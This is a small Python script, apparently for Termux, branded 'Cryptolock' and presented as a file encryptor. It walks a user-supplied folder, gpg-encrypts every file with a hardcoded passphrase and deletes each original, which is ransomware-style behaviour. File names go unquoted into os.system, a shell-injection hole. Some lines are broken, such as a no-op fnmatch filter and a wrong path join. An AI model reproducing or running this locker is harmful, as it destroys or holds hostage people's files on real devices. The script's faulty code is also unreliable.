import os
import time
import fnmatch

try:

	import gnupg
except ImportError:
	os.system('pkg install gnupg -y &> /dev/null')

def logo():
	os.system('clear')
	print ("""

   \033[1;92m   ___               _   _         _   
   \033[1;92m  / __|_ _ _  _ _ __| |_| |___  __| |__
   \033[1;96m | (__| '_| || | '_ \  _| / _ \/ _| / /
   \033[1;91m  \___|_|  \_, | .__/\__|_\___/\__|_\_\\
   \033[1;97m           |__/|_|                     

  	       \033[1;91mEncrypt \033[1;92myour \033[1;97mFiles\n""")



def crypt():

		logo()
		print ("\033[1;96mPath \033[1;97mFile:")
		path = str(input("\033[1;91m> \033[1;97m"))
		print ("")
		for sdcard, dirs, files in os.walk("{}".format(path)):
			for filename in files:
				filesnames = os.path.join(path, filename)
				time.sleep(1)
				print ("\033[1;92m[√] \033[1;97mFile encrypt: \033[1;97m{}".format(filename))
				os.system('gpg --batch -c --passphrase khazul0411 {}'.format(filesnames))

				fnmatch.filter(filename,'*.png'+'*.jpg'+'*.apk'+'*.mp4'+'*.mp3'+'*.txt')
				try:
					os.remove(filesnames)
				except:
					pass




if __name__=="__main__":
	crypt()
	while True:
		ul = str(input("\n\033[1;91m[?]\033[1;97mMau ulang? (y/n) "))
		if ul == "y":
			crypt()
		else:
			exit()
